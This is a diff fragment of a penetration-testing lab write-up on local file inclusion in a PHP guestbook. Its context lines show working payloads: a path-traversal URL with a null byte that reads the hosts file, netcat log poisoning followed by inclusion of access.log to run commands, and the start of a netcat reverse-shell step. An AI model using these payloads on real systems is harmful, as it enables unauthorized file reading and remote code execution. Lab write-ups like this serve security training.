@@ -15,11 +15,11 @@ include( $lang . '.php' );
 Because the LANG field can be controlled, the attacker can put in the path to a local or remote file.
 
 # 1. Local file inclusion (LFI)
-# a. Reading arbitrary files
+## a. Reading arbitrary files
 Windows hosts file:
 `http://10.11.23.188/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00&name=test&comment=test`
 
-# b. Contaminating apache log file and executing it
+## b. Contaminating apache log file and executing it
 Use netcat to connect to the server and contaminate `C:/xampp/apache/logs/access.log` file:
 ```
 root@kali:~# nc -v 10.11.23.188 80
@@ -35,7 +35,7 @@ After contamination, the access.log file on the serve is like this:
 Display the access.log file to execute the command:
 `http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig&name=test&comment=test`
 
-# c. Transferring netcat and obtaining reverse shell
+## c. Transferring netcat and obtaining reverse shell
 Kali:
 ```
 mkdir /tftp 
